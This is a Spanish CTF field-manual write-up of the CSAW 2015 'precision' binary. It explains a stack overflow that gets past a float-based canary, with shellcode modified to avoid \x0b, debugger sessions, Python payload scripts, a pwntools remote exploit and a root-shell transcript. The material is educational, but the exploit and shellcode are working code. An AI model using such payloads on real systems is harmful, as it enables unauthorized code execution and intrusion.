<html>

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <link rel="stylesheet" href="https://stackedit.io/style.css" />
</head>
<body class="stackedit">
  <div class="stackedit__html"><h1 id="manual">[User Space]...</h1>
  <pre><code>❯ ./rabbit_pwned

	                  .".
                         /  |
                        /  /
                       / ,"
           .-------.--- /
          ".____.-/ o. o\
                 (    Y  )
                  )     /
                 /     (
                /       Y
            .-"         |
           /  _     \    \
          /    `. ". ) /' )
         Y       )( / /(,/
        ,|      /     )
       (_|     /     /
          \_  (__   (__        
            "-._,)--._,)
</code></pre>
<p>Redactado por Alvaro M. aka <code><a href="https://twitter.com/naivenom">@naivenom</a></code>.</p>
<h2 id="indice">Indice</h2>
<h4 id="indice-exploiting">[Exploiting]</h4>
<p><a href="#refs_uno">1. Smashing Stack sobreescribiendo EIP con una direccion de memoria controlada por nosotros + float value(canary) + shellcode (I)</a></p>
<h2 id="introduccion">Introduccion</h2>
<p>Recomiendo que se tome este manual como una referencia y no una explicacion detallada de los retos que he ido realizando a lo largo del 2018. 
Realmente cada tecnica esta dividida en seis apartados con lo mas resañable e interesante a la hora de usar el Exploiting & Reversing Field Manual 2018 como una referencia y consulta a la hora de estar resolviendo un reto y ver la tecnica usada, los comandos usados, un breve resumen de un informe mas detallado y el codigo del exploit.
En la seccion de comandos solo me limito a poner el output del comando mas destacable, recomiendo que descarguen el binario y vean todo el contenido si lo requieren. No olviden que es un Field Manual y no tiene que ser extenso en cuanto a write-up de la tecnica, sino lo más importante y versatil para cuando se encuentren un problema de las mismas características.</p>
<h2><a id="refs_uno" href="#refs_uno">1. Smashing Stack sobreescribiendo EIP con una direccion de memoria controlada por nosotros apuntando al inicio del buffer + shellcode mod 0x0b + float value(stack canary)</a></h2>
<h4>[Informe]:</h4>
<em><strong>Recolección de información</strong></em>

Comenzamos analizando estáticamente el código desensamblado del binario. La función más resañable donde se encuentra la vulnerabilidad es en el <code>main()</code>.
En esta función una vez es llamada y configurar el stack en el prólogo ejecuta una instruccion realizando floating load <code>fld qword [0x8048690]</code>.
Seguidamente carga el float value en el stack <code>fstp qword [esp + 0x98]</code>. Luego analizando el desensamblado del binario realiza una serie de llamadas  a <code>printf()</code>, <code>scanf()</code> y probablemente tengamos un Buffer Overflow (BoF de ahora en adelante) despues de la función <code>scanf()</code> porque no controlora o checkeara cuantos caracteres o "junk" le enviemos en nuestro buffer.
Finalmente en el mismo bloque antes de llegar a un salto condicional y despues de ejecutar <code>scanf()</code> ejecuta la misma instrucción <code>fld qword [esp + 0x98]</code> realizando floating load donde previamente se escribio en el Stack y seguidamente ejecuta <code>fld qword [0x8048690]</code> siendo el original float value del calculo realizado en la FPU. Después de estas dos instrucciones tan relevantes realiza <code>fucompi st(1)</code> comparando ambos valores. Por tanto, esta comprobación que se realiza cuando se ejecuta despues del prólogo y antes del salto condicional es una especie de Stack Canary.
<pre><code>❯ Ejemplo_                                                                         
Buffer:            AAAAAAAAAAAAAAAAAAAAAAAAAA + 0.245454 + EIP
Smashing Float:    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA + MEMORY ADDRESS que queremos controlar
                                                          
FUCOMPI:           AAAAAAAA != 0.245454   Security Detected!

Bypass:            AAAAAAAAAAAAAAAAAAAAAAAAAA + 0.245454 + MEMORY ADDRESS
</code></pre>
Cuando debugeamos el binario y nos encontramos en la dirección de memoria <code>0x080485a3</code> y queremos desensamblar la dirección que contiene el float original value aparece su contenido, sin embargo si desensamblamos la dirección de memoria del stack <code>[esp+0x98]</code> podemos observar que su contenido son justo los valores <code>0x41414141</code> ya que con el data o "junk" que hemos enviado sobreescribe el float value y el stack canary nos lo detectara.

Seguidamente debemos saber donde esta localizada la dirección de memoria del float en el stack, y esta en los últimos 8 Bytes de <code>0xffffd2b0</code>
<em><strong>Explotación</strong></em>

Bien una vez obtenido toda la información necesaria para la explotación vamos a proceder usando GDB y colocando tres breakpoint en diferentes localizaciones del <code>main</code>:<code>0x804851d</code>,  <code>0x8048553</code>y <code>0x080485a3</code>
Usaremos la salida de la ejecución del primer buffer (ver:exploit) como entrada en el binario cuando lo ejecutemos. Cuando estamos en el último breakpoint y desensamblamos <code>$esp</code> vemos que con lo enviamos no sobreescribimos el float value: <code>0x475a31a5 0x40501555</code> por lo tanto ya lo tenemos calculado para poder bypassear el stack canary!.
Al continuar la ejecución sobreescribimos <code>$eip</code> con <code>0x43434343</code>, eso son las strings "CCCC" por tanto sólo necesitamos de "padding" unos 12 bytes más para luego sobreescribir <code>$eip</code>. Bien, una vez sabemos exactamente donde sobreescribe necesitaremos una shellcode para poder obtener una shell usando la dirección de memoria que vamos a sobreescribir para que <code>$eip</code> apunte al inicio de nuestro buffer aplicando "padding" y acoplando nuestra shellcode (ver:exploit). <a href="http://shell-storm.org/shellcode/files/shellcode-827.php">http://shell-storm.org/shellcode/files/shellcode-827.php</a>
Ejecutamos de nuevo y veremos que por algún motivo no escribe nuestra shellcode a partir del byte <code>\x0b</code> ya que el último en escribir es <code>0x0000b0c0</code>. Según lei este carácter en ascii esta dentro de los "whitespace" y no permite la lectura de mas "data" en la función <code>scanf()</code>, por tanto debido a esto nuestra shellcode falla ya que no sigue leyendo más input. Una solución a esto es hacer mover un valor mayor y restarlo y que el resultado sea el mismo <code>\x0b</code>.
<pre><code>0:  b0 4b                    mov    al,0x4b
2:  2c 40                    sub    al,0x40
</code></pre>
El resultado es el mismo, así que simplemente tenemos que coger: <code>b04b2c40</code> y modificar la shellcode (ver:exploit). Una vez modificada la shellcode, solo necesitamos terminar de desarrollar nuestro exploit segun las necesidades del entorno en el que nos encontramos.

Sabemos que el buffer que nos imprime por pantalla al ejecutar el binario coincide con la dirección de memoria del inicio de nuestro buffer donde realizamos el padding de <code>\x90</code> y luego nuestra shellcode, etc...Por tanto sabiendo que esa es la dirección de memoria que debemos sobreescribir <code>$eip</code> tenemos que tener en cuenta cuando desarrollemos el exploit y sabiendo que nos hace leak de la dirección usar en python la función <code>raw_input()</code> para añadirlo y el problema estará resuelto.

<em><strong>Obteniendo root shell</strong></em>
Pudimos debuggear y analizar el binario en nuestra maquina, pero ahora toca la fase en la que ganamos acceso. El binario vulnerable esta ejecutandose en el servidor victima en el puerto 1234.
<pre><code>root@kali:~/Desktop# nc -nvlp 1234 -e ./precision
listening on [any] 1234 ...
connect to [192.168.32.129] from (UNKNOWN) [192.168.32.142] 41286
</code></pre>
Ejecutamos en nuestra máquina atacante y root shell!!
<pre><code>naivenom@parrot:[~/pwn] $ python exploit_precision.py 
[+] Opening connection to 192.168.32.129 on port 1234: Done
Buff: 0xbfc92d98

0xbfc92d98
[*] Switching to interactive mode
Got \x90\x90\x90\x90\x90\x90\x90\x90\x90\x901�Ph//shh/bin\x89�PS\x89��K,@̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa51ZGU\x15P@AAAAAABBBBBB\x98-ɿ
$ id
uid=0(root) gid=0(root) groups=0(root)
$ whoami
root
$ uname -a
Linux kali 4.12.0-kali2-686 #1 SMP Debian 4.12.12-2kali1 (2017-09-13) i686 GNU/Linux
$ python -c 'import pty; pty.spawn("/bin/sh")'
# $ /bin/bash -i
/bin/bash -i
root@kali:/root/Desktop# $  
</code></pre>
&nbsp;
<h4>[Comandos]:</h4>
En esta sección haremos una explicación breve paso a paso de los comandos ejecutados. Colocamos un breakpoint justo en la instrucción <code>fucompi</code> y ejecutamos hasta el bp. Seguidamente entramos en visual mode. Por último vemos el desensamblado de la instrucción <code>[esp+0x98]</code> cuyo contenido en esa dirección de memoria es el valor del float value.
<pre><code>❯ r2 -d precision                                                                            
[0x0804851d]&gt; db 0x080485a3 
[0x0804851d]&gt; dc 
Buff: 0xffa3d9e8
AAAAAAAAAAAAAAAAAAAAAAAA
hit breakpoint at: 80485a3
[0x0804851d]&gt; vpp 
[0x080485a3 170 /home/naivenom/pwn/precision]&gt; ?0;f tmp;s.. @ eip                                                                         
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF                                                                     
0xffa3d9d0  8286 0408 e8d9 a3ff 0200 0000 0000 0000  ................                                                                     
0xffa3d9e0  9c1a f3f7 0100 0000 4141 4141 4141 4141  ........AAAAAAAA                                                                     
0xffa3d9f0  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA                                                                     
0xffa3da00  0000 0000 0000 c300 0000 0000 0010 f3f7  ................                                                                     
 eax 0x00000001      ebx 0x00000000      ecx 0x00000001      edx 0xf7ed689c                                                               
 esi 0xf7ed5000      edi 0x00000000      esp 0xffa3d9d0      ebp 0xffa3da78                                                               
 eip 0x080485a3      eflags 1ZI         oeax 0xffffffff                                                                                   
            ;-- eip:                                                                                                                      
|           0x080485a3 b    dfe9           fucompi st(1)                                                                                  
|           0x080485a5      ddd8           fstp st(0)

[0x080485a3]&gt; px@esp+0x98 
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xffa3da68  a531 5a47 5515 5040 0050 edf7 0050 edf7  .1ZGU.P@.P...P..

</code></pre>
Usaremos mejor GDB, y enviaremos por el input que nos ofrece el binario algunos "junk" data sin sobreescribir aún el float value en el stack. También veremos la informacion de los registros de la FPU y desensamblado de sus direcciones de memoria:
<pre><code>❯ gdb -q precision 
Reading symbols from precision...(no debugging symbols found)...done.
gdb-peda$ break *main
Breakpoint 1 at 0x804851d
gdb-peda$ break *0x080485a3
Breakpoint 2 at 0x80485a3
gdb-peda$ r
Starting program: /home/naivenom/pwn/precision 
Breakpoint 1, 0x0804851d in main ()
gdb-peda$ c
Continuing.
Buff: 0xffffd238
AAAAAAAAAA 
Breakpoint 2, 0x080485a3 in main ()
gdb-peda$ info float 
  R7: Valid   0x400580aaaa3ad18d2800 +64.33333000000000368      
=&gt;R6: Valid   0x400580aaaa3ad18d2800 +64.33333000000000368  
gdb-peda$ x/wx 0x8048690
0x8048690:	0x475a31a5
gdb-peda$ x/wx $esp+0x98
0xffffd2b8:	0x475a31a5
</code></pre>
Ahora una pequeña PoC con radare2. Desensamblamos la dirección de memoria para ver el contenido y smashing stack!! Sobreescritura del float value.
<pre><code>❯ r2 -d precision  
[0x0804851d]&gt; db 0x080485a3
[0x0804851d]&gt; dc
Buff: 0xfff92198
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
hit breakpoint at: 80485a3
[0x080485a3]&gt; px@esp+0x98 
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xfff92218  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0xfff92228  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0xfff92238  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0xfff92248  4141 4141 4100 eef7 0040 f0f7 0000 0000  AAAAA....@......
</code></pre>
También si observamos con radare2 tenemos el valor del float en el offset <code>0xffda4c70</code>:<code>a531 5a47 5515 5040</code>
<pre><code>❯ r2 -d precision 
[0x0804851d]&gt; db 0x08048543
[0x0804851d]&gt; dc
hit breakpoint at: 8048543
[0x0804851d]&gt; px@esp
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xffda4be0  0000 0000 8bcf f5f7 2082 0408 0000 0000  ........ .......
0xffda4bf0  9caa f7f7 0100 0000 10c4 f4f7 0100 0000  ................
0xffda4c00  0000 0000 0100 0000 40a9 f7f7 c200 0000  ........@.......
0xffda4c10  0000 0000 0000 c300 0000 0000 00a0 f7f7  ................
0xffda4c20  0000 0000 0000 0000 0000 0000 00b3 8163  ...............c
0xffda4c30  0900 0000 6e54 daff a98f d7f7 4817 f2f7  ....nT......H...
0xffda4c40  00e0 f1f7 00e0 f1f7 0000 0000 8583 0408  ................
0xffda4c50  fce3 f1f7 0000 0000 00a0 0408 3286 0408  ............2...
0xffda4c60  0100 0000 244d daff 2c4d daff a591 d7f7  ....$M..,M......
0xffda4c70  a029 f6f7 0000 0000 a531 5a47 5515 5040  .).......1ZGU.P@
</code></pre>
Colocamos tres breakpoints y ejecutamos el binario usando como input el buffer del script (ver:exploit) y verificamos desensamblando <code>$esp</code> que no hemos sobreescrito el float value. Finalmente sobreescrito <code>$eip</code>
<pre><code>gdb-peda$ break *main
Breakpoint 1 at 0x804851d
gdb-peda$ break *0x08048553
Breakpoint 2 at 0x8048553
gdb-peda$ break *0x080485a3
Breakpoint 3 at 0x80485a3
gdb-peda$ r &lt; salida
Breakpoint 1, 0x0804851d in main ()
gdb-peda$ c
Breakpoint 2, 0x08048553 in main ()
gdb-peda$ c
Continuing.
Buff: 0xffffd238
Breakpoint 3, 0x080485a3 in main ()
gdb-peda$ x/80wx $esp
0xffffd220:	0x08048682	0xffffd238	0x00000002	0x00000000
0xffffd230:	0xf7ffda9c	0x00000001	0x41414141	0x41414141
0xffffd240:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd250:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd260:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd270:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd280:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd290:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd2a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd2b0:	0x41414141	0x41414141	0x475a31a5	0x40501555
0xffffd2c0:	0x41414141	0x42424141	0x43424242	0x43434343
0xffffd2d0:	0x45444444	0x47464645	0x49484847	0x4b4a4a49
0xffffd2e0:	0x4d4c4c4b	0x0000004d	0xf7fa1000	0xf7fe574a
gdb-peda$ c
Continuing.
Got AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�1ZGUP@AAAAAABBBBBCCCCCDDDEEFFGGHHIIJJKKLLMM

Program received signal SIGSEGV, Segmentation fault.
Stopped reason: SIGSEGV
0x43434343 in ?? ()
gdb-peda$ </code></pre>
Si ejecutamos ahora con nuestra shellcode modificada vemos que escribe todo el "data" que nos faltaba y al final nuestro valor coincidente con el buffer <code>0xffffd238</code>
<pre><code>Breakpoint 2, 0x080485a3 in main ()
gdb-peda$ x/128wx $esp
0xffffd220:	0x08048682	0xffffd238	0x00000002	0x00000000
0xffffd230:	0xf7ffda9c	0x00000001	0x90909090	0x90909090
0xffffd240:	0x46b09090	0x80cdc031	0x315b07eb	0x2c4bb0c0
0xffffd250:	0x3180cd40	0xfff2e8c9	0x622fffff	0x622f6e69
0xffffd260:	0x41687361	0x41414141	0x41414141	0x41414141
0xffffd270:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd280:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd290:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd2a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd2b0:	0x41414141	0x41414141	0x475a31a5	0x40501555
0xffffd2c0:	0x41414141	0x42424141	0x42424242	0xffffd238

</code></pre>
<h4>[Exploit Development]:</h4>
Escribimos el primer buffer con "junk" data junto el contenido del float value y mas "junk" como flag's y situarnos bien donde estamos en la memoria.
<div style="background: #ffffff; overflow: auto; width: auto;">
<pre style="margin: 0; line-height: 125%;"><span style="color: #000080; font-weight: bold;">import</span> sys

sys.stdout.write(<span style="color: #0000ff;">"A"</span>*<span style="color: #0000ff;">128</span>+<span style="color: #0000ff;">"\xa5\x31\x5a\x47\x55\x15\x50\x40"</span>+<span style="color: #0000ff;">"AAAAAABBBBBCCCCCDDDEEFFGGHHIIJJKKLLMM"</span>)
</pre>
</div>
Modificación de la shellcode evitando el carácter <code>\x0b</code>
<div style="background: #ffffff; overflow: auto; width: auto;">
<pre style="margin: 0; line-height: 125%;"><span style="color: #000080; font-weight: bold;">import</span> sys

sys.stdout.write(<span style="color: #0000ff;">"\x90"</span>*<span style="color: #0000ff;">10</span>+<span style="color: #0000ff;">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x4b\x2c\x40\xcd\x80"</span>+<span style="color: #0000ff;">"A"</span>*<span style="color: #0000ff;">93</span>+<span style="color: #0000ff;">"\xa5\x31\x5a\x47\x55\x15\x50\x40"</span>+<span style="color: #0000ff;">"AAAAAABBBBBB"</span>+<span style="color: #0000ff;">"\x38\xd2\xff\xff"</span>)
</pre>
</div>
Exploit remoto final.
<div style="background: #ffffff; overflow: auto; width: auto;">
<pre style="margin: 0; line-height: 125%;"><span style="color: #000080; font-weight: bold;">from</span> pwn <span style="color: #000080; font-weight: bold;">import</span> *
<span style="color: #000080; font-weight: bold;">import</span> struct

p = remote(<span style="color: #0000ff;">'192.168.32.129'</span>, <span style="color: #0000ff;">1234</span>)
<span style="color: #000080; font-weight: bold;">print</span> p.recvline()
a = <span style="color: #000080; font-weight: bold;">lambda</span> a: struct.pack(<span style="color: #0000ff;">"I"</span>,a)
eip = int(raw_input(),<span style="color: #0000ff;">16</span>)

exploit = <span style="color: #0000ff;">""</span>
exploit += <span style="color: #0000ff;">"\x90"</span>*<span style="color: #0000ff;">10</span>
exploit += <span style="color: #0000ff;">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x4b\x2c\x40\xcd\x80"</span>
exploit += <span style="color: #0000ff;">"A"</span>*<span style="color: #0000ff;">93</span>
exploit += <span style="color: #0000ff;">"\xa5\x31\x5a\x47\x55\x15\x50\x40"</span>
exploit += <span style="color: #0000ff;">"AAAAAABBBBBB"</span>
exploit += a(eip)
p.sendline(exploit)

p.interactive()
</pre>
</div>
<h4>[URL Reto]:</h4>
<a href="https://github.com/ctfs/write-ups-2015/blob/master/csaw-ctf-2015/pwn/precision-100/precision_a8f6f0590c177948fe06c76a1831e650">--Precision100 CSAW CTF 2015--</a>

</div>
